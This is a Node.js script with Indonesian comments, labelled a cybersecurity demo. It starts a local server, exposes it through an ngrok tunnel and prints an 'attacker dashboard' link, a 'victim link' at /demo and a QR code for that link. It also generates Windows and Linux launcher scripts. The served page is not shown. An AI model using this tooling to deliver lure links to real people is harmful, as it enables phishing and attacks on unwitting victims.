// tunnel.js - Script untuk auto tunnel dengan ngrok
const { exec, spawn } = require("child_process");
const http = require("http");
const fs = require("fs");
const os = require("os");

// Warna untuk console
const colors = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  red: "\x1b[31m",
};

console.log(
  `${colors.bright}${colors.cyan}========================================${colors.reset}`,
);
console.log(
  `${colors.bright}${colors.green}  DEMO CYBERSECURITY - NGROK TUNNEL${colors.reset}`,
);
console.log(
  `${colors.bright}${colors.cyan}========================================${colors.reset}`,
);
console.log("");

// Fungsi untuk mendapatkan IP lokal
function getLocalIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}

// Cek apakah server sudah jalan
function checkServer(callback) {
  console.log(
    `${colors.yellow}🔍 Mengecek server di port 3000...${colors.reset}`,
  );

  http
    .get("http://localhost:3000/api/test", (res) => {
      if (res.statusCode === 200) {
        console.log(
          `${colors.green}✅ Server sudah berjalan di port 3000${colors.reset}`,
        );
        callback(true);
      } else {
        callback(false);
      }
    })
    .on("error", () => {
      console.log(
        `${colors.red}❌ Server tidak berjalan di port 3000${colors.reset}`,
      );
      callback(false);
    });
}

// Jalankan server jika belum jalan
function startServer(callback) {
  console.log(`${colors.yellow}🚀 Menjalankan server...${colors.reset}`);

  const server = spawn("node", ["server.js"], {
    detached: true,
    stdio: "ignore",
  });

  server.unref();

  // Tunggu server siap
  let attempts = 0;
  const interval = setInterval(() => {
    http
      .get("http://localhost:3000/api/test", (res) => {
        if (res.statusCode === 200) {
          clearInterval(interval);
          console.log(
            `${colors.green}✅ Server berhasil dijalankan${colors.reset}`,
          );
          callback();
        }
      })
      .on("error", () => {
        attempts++;
        if (attempts > 10) {
          clearInterval(interval);
          console.log(
            `${colors.red}❌ Gagal menjalankan server${colors.reset}`,
          );
          process.exit(1);
        }
      });
  }, 1000);
}

// Jalankan ngrok tunnel
function startNgrok() {
  console.log(`${colors.yellow}🔄 Membuat tunnel ngrok...${colors.reset}`);

  // Jalankan ngrok
  const ngrok = spawn("ngrok", ["http", "3000", "--log=stdout"]);

  ngrok.stdout.on("data", (data) => {
    const output = data.toString();
    if (output.includes("started tunnel")) {
      // Dapatkan URL setelah tunnel siap
      setTimeout(getNgrokUrl, 2000);
    }
  });

  ngrok.stderr.on("data", (data) => {
    console.error(`${colors.red}❌ Ngrok error: ${data}${colors.reset}`);
  });

  return ngrok;
}

// Dapatkan URL ngrok dari API lokal
function getNgrokUrl() {
  http
    .get("http://localhost:4040/api/tunnels", (res) => {
      let data = "";

      res.on("data", (chunk) => {
        data += chunk;
      });

      res.on("end", () => {
        try {
          const tunnels = JSON.parse(data);
          const httpsTunnel = tunnels.tunnels.find((t) => t.proto === "https");

          if (httpsTunnel) {
            const url = httpsTunnel.public_url;
            const localIP = getLocalIP();

            console.log("");
            console.log(
              `${colors.bright}${colors.green}✅ TUNNEL BERHASIL DIBUAT!${colors.reset}`,
            );
            console.log("");
            console.log(
              `${colors.cyan}========================================${colors.reset}`,
            );
            console.log(`${colors.bright}🌐 URL PUBLIK:${colors.reset}`);
            console.log(`${colors.green}${colors.bright}${url}${colors.reset}`);
            console.log("");
            console.log(
              `${colors.bright}📊 DASHBOARD ATTACKER:${colors.reset}`,
            );
            console.log(`${colors.yellow}   ${url}${colors.reset}`);
            console.log("");
            console.log(`${colors.bright}🎯 LINK UNTUK KORBAN:${colors.reset}`);
            console.log(`${colors.red}   ${url}/demo${colors.reset}`);
            console.log("");
            console.log(`${colors.bright}📈 INSPECT TRAFFIC:${colors.reset}`);
            console.log(`   http://localhost:4040`);
            console.log("");
            console.log(`${colors.bright}🏠 AKSES LOKAL:${colors.reset}`);
            console.log(`   http://localhost:3000`);
            console.log(`   http://${localIP}:3000`);
            console.log("");
            console.log(
              `${colors.cyan}========================================${colors.reset}`,
            );
            console.log("");
            console.log(
              `${colors.yellow}⚠️  QR Code untuk korban:${colors.reset}`,
            );
            console.log(
              `   https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${url}/demo`,
            );
            console.log("");
            console.log(
              `${colors.magenta}📋 Copy link korban: ${url}/demo${colors.reset}`,
            );
            console.log("");
            console.log(
              `${colors.bright}Tekan Ctrl+C untuk menghentikan tunnel${colors.reset}`,
            );

            // Save URL ke file
            const info = `
DEMO CYBERSECURITY TUNNEL
=========================
URL Publik: ${url}
Dashboard: ${url}
Link Korban: ${url}/demo
Inspect: http://localhost:4040
Dibuat: ${new Date().toLocaleString()}
                    `;
            fs.writeFileSync("tunnel-info.txt", info);
          } else {
            console.log(
              `${colors.red}❌ Tidak bisa mendapatkan URL HTTPS${colors.reset}`,
            );
          }
        } catch (e) {
          console.log(
            `${colors.red}❌ Error parsing ngrok response: ${e.message}${colors.reset}`,
          );
        }
      });
    })
    .on("error", (err) => {
      console.log(
        `${colors.red}❌ Error mendapatkan URL: ${err.message}${colors.reset}`,
      );
    });
}

// Buat file bat/cmd untuk Windows
function createWindowsScript() {
  const script = `@echo off
echo ========================================
echo   DEMO CYBERSECURITY - NGROK TUNNEL
echo ========================================
echo.

:: Jalankan server Node
start /B node server.js
echo [✓] Server started on port 3000
timeout /t 3 /nobreak > nul

:: Jalankan ngrok
echo [*] Starting ngrok tunnel...
start /B ngrok http 3000

:: Tunggu tunnel siap
timeout /t 5 /nobreak > nul

:: Buka dashboard ngrok
start http://localhost:4040

:: Dapatkan URL
echo.
echo ========================================
echo TUNNEL AKTIF! Lihat URL di:
echo http://localhost:4040
echo.
echo LINK UNTUK KORBAN: http://localhost:3000/demo
echo (ganti dengan URL ngrok yang muncul)
echo ========================================
echo.
echo Tekan Ctrl+C untuk menghentikan...
pause
`;

  fs.writeFileSync("start-demo.bat", script);
  console.log(
    `${colors.green}✅ File start-demo.bat dibuat untuk Windows${colors.reset}`,
  );
}

// Buat file bash untuk Linux/Mac
function createLinuxScript() {
  const script = `#!/bin/bash

echo "========================================"
echo "  DEMO CYBERSECURITY - NGROK TUNNEL"
echo "========================================"
echo ""

# Jalankan server
node server.js &
SERVER_PID=$!
echo "✅ Server started on port 3000"
sleep 3

# Jalankan ngrok
ngrok http 3000 &
NGROK_PID=$!
echo "✅ Ngrok tunnel started"
sleep 5

# Dapatkan URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok\.io' | head -1)

echo ""
echo "========================================"
echo "🌐 URL PUBLIK: ${NGROK_URL}"
echo ""
echo "📊 DASHBOARD: ${NGROK_URL}"
echo "🎯 LINK KORBAN: ${NGROK_URL}/demo"
echo "📈 INSPECT: http://localhost:4040"
echo "========================================"
echo ""
echo "QR Code: https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${NGROK_URL}/demo"
echo ""
echo "Tekan Ctrl+C untuk menghentikan..."

# Tunggu interrupt
wait $SERVER_PID
`;

  fs.writeFileSync("start-demo.sh", script);
  fs.chmodSync("start-demo.sh", "755");
  console.log(
    `${colors.green}✅ File start-demo.sh dibuat untuk Linux/Mac${colors.reset}`,
  );
}

// Main function
async function main() {
  // Cek apakah server sudah jalan
  checkServer(async (isRunning) => {
    if (!isRunning) {
      await new Promise((resolve) => {
        startServer(resolve);
      });
    }

    // Buat script untuk platform yang berbeda
    if (process.platform === "win32") {
      createWindowsScript();
    } else {
      createLinuxScript();
    }

    // Jalankan ngrok
    const ngrok = startNgrok();

    // Handle exit
    process.on("SIGINT", () => {
      console.log("");
      console.log(`${colors.yellow}🛑 Menghentikan tunnel...${colors.reset}`);
      ngrok.kill();
      process.exit();
    });
  });
}

// Jalankan main function
main();
